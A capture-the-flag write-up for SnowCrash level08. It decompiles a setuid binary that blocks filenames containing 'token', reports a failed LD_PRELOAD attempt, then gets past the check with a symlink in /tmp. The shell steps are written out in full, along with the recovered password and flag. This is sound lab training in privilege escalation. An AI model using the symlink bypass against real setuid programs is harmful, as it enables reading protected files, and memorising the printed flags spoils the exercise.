# Level08

## Walkthrough

Listing the files in the directory, we find a binary file `level08` with a `token` text file.

```bash
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ file level08 
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
```

As in the previous levels, the `level08` file has the setuid flag and is owned by `flag08`.  
We import the executable on our host machine with SCP.

```bash
host:~$ scp -P 4242 level08@localhost:level08 level08
```

And let's decompile the executable with dogbolt.

[Link to the decompiled output](https://dogbolt.org/?id=dd39ba2e-06a7-4e59-b781-7ddd00932474#Hex-Rays=121)

By checking the main function, we can figure out that the program:
- accepts arguments
- compares the first argument with the word "token" and exits if they match
- opens the file associated with the first argument, reads it and write the output on stdout

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+24h] [ebp-40Ch]
  size_t v5; // [esp+28h] [ebp-408h]
  char buf[1024]; // [esp+2Ch] [ebp-404h] BYREF
  unsigned int v7; // [esp+42Ch] [ebp-4h]

  v7 = __readgsdword(0x14u);
  if ( argc == 1 )
  {
    printf("%s [file to read]\n", *argv);
    exit(1);
  }
  if ( strstr(argv[1], "token") )
  {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
  }
  v4 = open(argv[1], 0);
  if ( v4 == -1 )
    err(1, "Unable to open %s", argv[1]);
  v5 = read(v4, buf, 0x400u);
  if ( v5 == -1 )
    err(1, "Unable to read fd %d", v4);
  return write(1, buf, v5);
}
```

Our first attempt to solve this level is to override the `strstr()` function, using `LD_PRELOAD`, in order to always return `false` and not exit early.  
But it appears that `LD_PRELOAD` can't be used with the setuid flag.

Let's try another solution, this time using symbolic links to bypass the condition because `strstr()` doesn't follow the symbolic link.

```bash
level08@SnowCrash:~$ mkdir /tmp/level08
level08@SnowCrash:~$ cd /tmp/level08
level08@SnowCrash:/tmp/level08$ ln -s ~/token symlink
level08@SnowCrash:/tmp/level08$ ls -la
total 0
drwxrwxr-x 2 level08 level08  60 Feb 10 16:31 .
d-wx-wx-wx 5 root    root    100 Feb 10 16:31 ..
lrwxrwxrwx 1 level08 level08  24 Feb 10 16:31 symlink -> /home/user/level08/token
level08@SnowCrash:/tmp/level08$ ~/level08 symlink 
quif5eloekouj29ke0vouxean
level08@SnowCrash:/tmp/level08$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Resources

- [What is LD_PRELOAD trick](https://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick)
- [LD_PRELOAD with setuid binary](https://stackoverflow.com/questions/9232892/ld-preload-with-setuid-binary)
